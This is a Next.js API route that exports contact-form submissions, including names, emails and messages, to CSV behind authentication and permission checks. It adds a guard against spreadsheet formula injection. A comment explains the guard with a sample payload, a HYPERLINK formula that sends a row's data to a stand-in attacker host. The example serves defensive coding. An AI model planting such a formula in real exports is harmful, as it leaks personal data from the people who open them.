import { NextRequest, NextResponse } from 'next/server'
import { getSessionFromCookie } from '@/lib/auth/session'
import { hasPermission } from '@/lib/permissions/check'
import { errorResponse } from '@/lib/utils'
import { getSubmissionsForExport } from '@/modules/contact-form/lib/db'

export async function GET(request: NextRequest) {
  const user = await getSessionFromCookie()
  if (!user) return errorResponse('Not authenticated', 401)
  if (!await hasPermission(user, 'contact.export')) return errorResponse('Forbidden', 403)

  const { searchParams } = new URL(request.url)
  const status = searchParams.get('status') ?? undefined
  const submissions = await getSubmissionsForExport(status)

  const headers = ['id', 'date', 'name', 'email', 'phone', 'company', 'subject', 'message', 'status', 'gdpr_consent']
  const rows = submissions.map((s) => [
    s.id,
    s.createdAt.toISOString(),
    s.name,
    s.email,
    s.phone ?? '',
    s.company ?? '',
    s.subject ?? '',
    s.message,
    s.status,
    s.gdprConsent ? 'yes' : 'no',
  ].map(csvEscape).join(','))

  const csv = [headers.join(','), ...rows].join('\n')

  return new NextResponse(csv, {
    headers: {
      'Content-Type': 'text/csv; charset=utf-8',
      'Content-Disposition': `attachment; filename="contact-submissions-${new Date().toISOString().slice(0, 10)}.csv"`,
    },
  })
}

// Quoting alone isn't enough. A cell that opens with =, +, - or @ is read as a
// FORMULA by Excel, Sheets and Numbers, quoted or not - so a message body of
// `=HYPERLINK("https://evil.example/?"&A1,"Click")` runs the moment an admin
// opens the export, exfiltrating the row it sits next to. The message text is
// written by an unauthenticated stranger, so neutralise the lead character by
// prefixing a single quote, which spreadsheets treat as "this is text".
// (Tab and carriage return are included: both are also treated as formula leads.)
function neutraliseFormula(str: string): string {
  return /^[=+\-@\t\r]/.test(str) ? `'${str}` : str
}

function csvEscape(value: string): string {
  const str = neutraliseFormula(String(value))
  if (str.includes(',') || str.includes('"') || str.includes('\n')) {
    return `"${str.replace(/"/g, '""')}"`
  }
  return str
}
